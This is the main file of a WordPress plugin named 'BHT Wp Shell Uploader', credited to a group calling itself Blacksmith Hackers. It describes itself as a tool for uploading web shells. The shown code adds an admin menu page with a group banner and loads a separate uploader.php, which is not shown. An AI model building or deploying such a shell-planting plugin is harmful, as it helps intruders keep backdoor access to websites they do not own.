<?php

/*
Plugin Name: BHT Wp Shell Uploader
Plugin URI: https://github.com/Wp-ShellUp
Description: Simple Wordpress File (Shells) Uploader Plugin....
Version: 1.0
Author: Imran Md. Aziul Islam
Author URI: https://facebook.com/liquid.imran
License: GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
*/

define( 'BHT_PLUGIN_DIR', plugin_dir_path( __FILE__ ) );

// Registering Custom Plugin And Intergrating It To Wordpress API

add_action( 'admin_menu', 'liquid_main_callback' );

function liquid_main_callback(){
	add_menu_page( 'BlackSmith Hackers', 'BHT', 'administrator', 'bht_uploader', 'liquid_uploader_callback'); 
}

// Working On Adminstrator Page And Adding Function

function liquid_uploader_callback(){
		echo '
		<div align="center" style="margin-top:50px">
		  <img src="http://s1.directupload.net/images/130831/2xlwno8m.png" width="20%" height="auto"/>
		  <h1>Blacksmith Hackers</h1>
		  <h2>.:: Developer: Imran Md. Azizul Islam::.</h2>
		</div> ';
}

require_once( BHT_PLUGIN_DIR . 'uploader.php' );
 
 
?>
